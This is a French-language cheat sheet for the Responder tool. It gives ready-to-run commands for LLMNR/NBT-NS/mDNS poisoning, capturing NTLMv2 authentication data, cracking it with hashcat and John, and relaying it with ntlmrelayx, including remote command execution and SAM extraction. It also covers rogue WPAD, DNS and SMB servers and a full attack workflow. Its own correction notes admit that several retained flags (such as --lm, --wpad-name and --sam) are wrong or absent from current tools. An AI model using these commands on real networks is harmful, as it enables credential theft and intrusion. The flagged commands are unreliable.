# 🎣 Responder — empoisonnement LLMNR/NBT-NS

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗ 
  ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
  ██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
  ██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
  ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               Empoisonnement LLMNR/NBT-NS/mDNS
```

<p align="center">
  <img src="https://img.shields.io/badge/Responder-NTLM_Capture-red?style=for-the-badge" alt="Responder">
  <img src="https://img.shields.io/badge/LLMNR-Poisoning-blue?style=for-the-badge" alt="LLMNR">
</p>

---

## 📋 Table des matières

- [Qu’est-ce que Responder ?](#-quest-ce-que-responder-)
- [Installation](#-installation)
- [Utilisation de base](#-utilisation-de-base)
- [Capturer des données NTLMv2](#-capturer-des-données-ntlmv2)
- [Attaques par relais](#-attaques-par-relais)
- [Serveurs usurpateurs](#-serveurs-usurpateurs)
- [Configuration](#-configuration)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce que Responder ?

**Responder** falsifie les réponses LLMNR, NBT-NS et mDNS pour recueillir des données d’authentification NTLM :

- 🎣 **Empoisonnement LLMNR** — Résolution de noms par multidiffusion sur le lien local
- 📡 **Empoisonnement NBT-NS** — Service de noms NetBIOS
- 🍎 **Empoisonnement mDNS** — DNS par multidiffusion
- 🔓 **Capture d’empreintes** — Données NTLMv1/NTLMv2
- 🔄 **Prise en charge du relais** — Attaques par relais NTLM

### Fonctionnement

> **Précision :** Les noms de résolution et leurs replis dépendent de la configuration. Ce schéma est simplifié : les données NetNTLM capturées sont des réponses à un défi, pas l’empreinte NT réutilisable directement en Pass-the-Hash ([protocole Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/d43e2224-6fc3-449d-9f37-b90b55a29c80)).

```
1. Un utilisateur saisit un nom d’hôte erroné : \\fileservr (faute de frappe)
2. DNS ne résout pas ce nom
3. Windows diffuse une requête LLMNR/NBT-NS
4. Responder répond : "I'm fileservr!" (il prétend être fileservr)
5. La victime transmet des données NTLM pour s’authentifier
6. Les données sont capturées pour la recherche de mot de passe ou le relais
```

---

## 🚀 Installation

### Kali Linux

```bash
# Préinstallé
responder --help

# Mettre à jour
sudo apt update && sudo apt install responder

# Ou depuis GitHub
git clone https://github.com/lgandx/Responder.git
cd Responder
python Responder.py --help
```

### Vérifier l’installation

```bash
responder --help
responder -I eth0 --version
```

---

## 💻 Utilisation de base

### Démarrer Responder

> **Précision :** `-A` désactive les réponses d’empoisonnement NBT-NS/LLMNR/mDNS ; ce mode ne garantit pas que tous les serveurs configurés cessent d’écouter. « Passif » doit être compris dans ce périmètre ([source officielle](https://github.com/lgandx/Responder/blob/master/Responder.py)).

```bash
# Utilisation de base (capture d’empreintes)
sudo responder -I eth0

# Sortie détaillée
sudo responder -I eth0 -v

# Mode d’analyse (passif selon l’original)
sudo responder -I eth0 -A
```

### Choisir l’interface

```bash
# Ethernet
sudo responder -I eth0

# Sans fil
sudo responder -I wlan0

# Lister les interfaces
ip a
```

---

## 🔓 Capturer des données NTLMv2

### Capture de base

```bash
# Démarrer Responder
sudo responder -I eth0

# Attendre des connexions de victimes…
# Sortie :
[+] Listening for events...
[HTTP] NTLMv2 Client   : 192.168.1.100
[HTTP] NTLMv2 Username : DOMAIN\user
[HTTP] NTLMv2 Hash     : user::DOMAIN:1122334455667788:...
```

### Forcer NTLMv2 (intitulé de l’original)

> **Précision :** `--lm` demande une rétrogradation LM pour des systèmes anciens, pas « NTLMv2 uniquement ». La commande et le commentaire historiques restent conservés ([parseur officiel](https://github.com/lgandx/Responder/blob/master/Responder.py)).

```bash
# NTLMv2 uniquement (recommandé pour la recherche de mot de passe selon l’original)
sudo responder -I eth0 --lm
```

### Capture WPAD

> **Précision :** WPAD est un mécanisme de découverte de proxy. `-F` impose une authentification NTLM/Basic lors de la récupération de wpad.dat, sans garantir Basic seul. L’option `--wpad-name` montrée plus loin n’existe pas dans le parseur actuel cité ([source officielle](https://github.com/lgandx/Responder/blob/master/Responder.py)).

```bash
# Activer le proxy WPAD
sudo responder -I eth0 -w

# Imposer l’authentification WPAD
sudo responder -I eth0 -wF
```

### Emplacement des captures

> **Précision :** Les chemins dépendent de l’installation ; la source actuelle place les journaux dans un dossier logs sous le répertoire de Responder ([configuration du programme](https://github.com/lgandx/Responder/blob/master/settings.py)).

```bash
# Les empreintes capturées sont enregistrées dans :
/usr/share/responder/logs/
# Ou
./logs/

# Fichiers :
Responder-Session.log
SMB-NTLMv2-*.txt
HTTP-NTLMv2-*.txt
```

### Rechercher les mots de passe des captures

```bash
# Format NTLMv2 :
# user::DOMAIN:ServerChallenge:NTProofStr:NTLMv2Response

# Hashcat (mode 5600)
hashcat -m 5600 hash.txt wordlist.txt

# John
john --format=netntlmv2 hash.txt
```

---

## 🔄 Attaques par relais

> **Précision :** Un relais utilise une authentification en cours ; un fichier de capture n’est pas à lui seul une authentification rejouable. Droits et protections du protocole, dont la signature SMB, conditionnent le résultat. Désactiver les serveurs Responder libère leurs points d’écoute sans garantir le succès du relais ([Microsoft](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview), [ntlmrelayx officiel](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)).

### Désactiver SMB/HTTP pour le relais

```bash
# Modifier Responder.conf
sudo nano /usr/share/responder/Responder.conf

# Définir :
SMB = Off
HTTP = Off
```

### Responder et ntlmrelayx

```bash
# Terminal 1 : Responder sans SMB/HTTP
sudo responder -I eth0

# Terminal 2 : ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Ou avec exécution d’une commande
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

### Relais vers LDAP

```bash
# Responder
sudo responder -I eth0

# Relais vers LDAP
impacket-ntlmrelayx -t ldap://DC01.domain.local
```

### Relais pour extraire la SAM

> **Précision :** `--sam` ne figure pas dans le parseur ntlmrelayx actuel cité ; l’exemple historique est conservé ([source officielle](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)).

```bash
# Extraire la SAM lors du relais
impacket-ntlmrelayx -tf targets.txt -smb2support --sam
```

---

<a id="-serveurs-usurpateurs"></a>
## 🖥️ Serveurs usurpateurs

### Serveurs intégrés

| Serveur | Port | Fonction |
|--------|------|---------|
| SMB | 445 | Authentification des partages de fichiers |
| HTTP | 80 | Authentification web |
| HTTPS | 443 | Web sécurisé |
| FTP | 21 | Authentification FTP |
| SQL | 1433 | Authentification MSSQL |
| LDAP | 389 | Authentification de l’annuaire |
| WPAD | 80 | Configuration du proxy |

### Activer ou désactiver les serveurs

```bash
# Modifier Responder.conf
[Responder Core]
; Serveurs à démarrer
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
```

### Proxy WPAD usurpateur

```bash
# Activer WPAD
sudo responder -I eth0 -w

# Imposer l’authentification Basic sur WPAD selon l’original
sudo responder -I eth0 -wF

# Script WPAD personnalisé
sudo responder -I eth0 -w --wpad-name wpad.dat
```

### Usurpation DNS

> **Précision :** `-d` active des réponses DHCP, pas simplement un serveur DNS. Le serveur DNS relève de la configuration ; les commentaires historiques ne décrivent donc pas exactement cette option ([parseur](https://github.com/lgandx/Responder/blob/master/Responder.py), [configuration](https://github.com/lgandx/Responder/blob/master/Responder.conf)).

```bash
# Activer DNS selon l’original
sudo responder -I eth0 -d

# Responder devient un serveur DNS selon l’original
# Répond aux requêtes pour tous les hôtes selon l’original
```

---

<a id="-configuration"></a>
## ⚙️ Configuration

### Responder.conf

```bash
# Emplacement
/usr/share/responder/Responder.conf
# Ou
./Responder.conf
```

### Paramètres principaux

> **Précision :** Les clés et valeurs de l’exemple restent inchangées. DontRespondTo exclut des adresses IP précisées ; il ne désigne pas automatiquement toutes les requêtes locales ([configuration officielle](https://github.com/lgandx/Responder/blob/master/Responder.conf)).

```ini
[Responder Core]
; Définir On ou Off
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On

; Défi personnalisé pour les tables précalculées (rainbow tables)
Challenge = Random

; Ne pas répondre aux requêtes locales selon l’original
DontRespondTo =

; Répondre uniquement à ces adresses IP
RespondTo =
```

### Défi fixe (tables précalculées)

> **Précision :** Un défi serveur fixe ne rend pas toute réponse NTLMv2 attaquable par une table universelle : la réponse contient aussi des données propres au client. Le bloc est un exemple historique ([structure Microsoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/d43e2224-6fc3-449d-9f37-b90b55a29c80)).

```ini
; Définir un défi fixe pour des tables précalculées
Challenge = 1122334455667788
```

### Exclusions

```ini
; Ne pas répondre à ces adresses IP
DontRespondTo = 192.168.1.1, 192.168.1.2

; Répondre uniquement à celles-ci
RespondTo = 192.168.1.100, 192.168.1.101
```

---

## 📊 Référence rapide

### Commandes essentielles

| Commande | Description |
|---------|-------------|
| `responder -I eth0` | Capture de base |
| `responder -I eth0 -v` | Sortie détaillée |
| `responder -I eth0 -A` | Analyse seule selon le périmètre décrit |
| `responder -I eth0 -w` | Activer WPAD |
| `responder -I eth0 -wF` | Imposer l’authentification WPAD |
| `responder -I eth0 -d` | Activer DNS selon l’original |

### Options

| Option | Description |
|------|-------------|
| `-I` | Interface |
| `-v` | Sortie détaillée |
| `-A` | Mode d’analyse (passif selon l’original) |
| `-w` | Activer WPAD |
| `-wF` | Imposer l’authentification WPAD |
| `-d` | Activer DNS selon l’original |
| `-f` | Identifier les caractéristiques des hôtes |
| `-b` | Proposer l’authentification Basic |

### Types d’empreintes

| Type | Mode Hashcat | Format John |
|------|--------------|-------------|
| NTLMv1 | 5500 | netntlm |
| NTLMv2 | 5600 | netntlmv2 |

### Déroulement d’une attaque

```bash
# 1. Démarrer Responder
sudo responder -I eth0 -wFv

# 2. Attendre les captures
# Captures enregistrées dans ./logs/

# 3. Rechercher les mots de passe
hashcat -m 5600 ./logs/*NTLM*.txt rockyou.txt

# 4. Ou effectuer un relais (désactiver SMB au préalable)
sudo responder -I eth0  # SMB=Off dans la configuration
impacket-ntlmrelayx -tf targets.txt -smb2support
```

### Déroulement d’un relais

```bash
# 1. Repérer les cibles sans signature SMB
cme smb 10.10.10.0/24 --gen-relay-list relay.txt

# 2. Configurer Responder.conf
# SMB = Off
# HTTP = Off

# 3. Démarrer Responder
sudo responder -I eth0

# 4. Démarrer le relais
impacket-ntlmrelayx -tf relay.txt -smb2support

# 5. Attendre une authentification relayée
```

---

## 📚 Ressources

- [Responder sur GitHub](https://github.com/lgandx/Responder)
- [Empoisonnement LLMNR](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
- [ntlmrelayx](https://github.com/fortra/impacket)

### Aide-mémoire associés
- [Impacket](../../Impacket/translations/README.fr.md)
- [CrackMapExec](../../CrackMapExec/translations/README.fr.md)
- [Hashcat](../../Hashcat/translations/README.fr.md)

---

<p align="center">
  <b>🎣 Comprenez la capture de données d’authentification !</b><br>
  <i>Responder — collecte de données d’authentification sur le réseau</i>
</p>
